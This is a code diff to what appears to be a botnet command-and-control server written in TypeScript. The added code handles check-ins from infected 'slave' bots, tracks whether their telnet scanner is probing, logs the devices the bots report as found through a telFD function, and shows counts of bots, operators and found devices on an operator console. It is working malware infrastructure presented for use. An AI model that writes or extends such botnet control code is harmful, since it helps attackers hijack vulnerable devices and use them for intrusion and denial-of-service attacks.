@@ -72,8 +72,29 @@ function create_and_bind(port : number) {
           removeClient(socket);
       })
 
-      socket.on('data', function(data) {
-        // parse slave response
+      socket.on('data', function(data) { // this whole scanner method is stupid but im porting it anyway
+        let resolved = true;
+        switch(data.toString().trim()) {
+          case 'PING':
+            socket.write('PONG\n');
+            break;
+          case 'PROBING':
+            scannerreport = 1;
+            break;
+          case 'REMOVING PROBE':
+            scannerreport = 0;
+            break;
+          default:
+            resolved = false;
+            break;
+        }
+        if(resolved) return;
+
+        let report = data.toString().split(' ');
+        if(report.length == 2) { // perhaps a limit/validation here would be nice for the str size etc
+          telFD(`${report[1]}\n`);
+          TELFound++;
+        }
       })
   }).listen(port);
 }
@@ -132,7 +153,7 @@ function BotWorker(port: number) {
             socket.write(`[+] - Slaves: [\x1b[36m ${BotsConnected()} \x1b[37m] [+] - Masters: [\x1b[36m ${OperatorsConnected} \x1b[37m]\r\n`);
             break;
           case 'STATUS':
-            socket.write('[+] - Devices: [\x1b[36m %d \x1b[37m] [+] - Status: [\x1b[36m %d \x1b[37m]\r\n');
+            socket.write(`[+] - Devices: [\x1b[36m ${TELFound} \x1b[37m] [+] - Status: [\x1b[36m ${scannerreport} \x1b[37m]\r\n`);
             break;
           case 'HELP':
             socket.write('   \r\n\x1b[37m#--- \x1b[36mCOMMANDS \x1b[37m---#\r\n\r\n');
@@ -216,7 +237,6 @@ async function main() {
   console.log('Bot Port', process.argv[2], 'CNC Port', port);
   create_and_bind(Number(process.argv[2])); // Bot port
   BotWorker(port); // cnc port
-  //telFD("test\n");
 
   // Load accounts
   const file = await fs.readFile('login.txt', 'utf8');
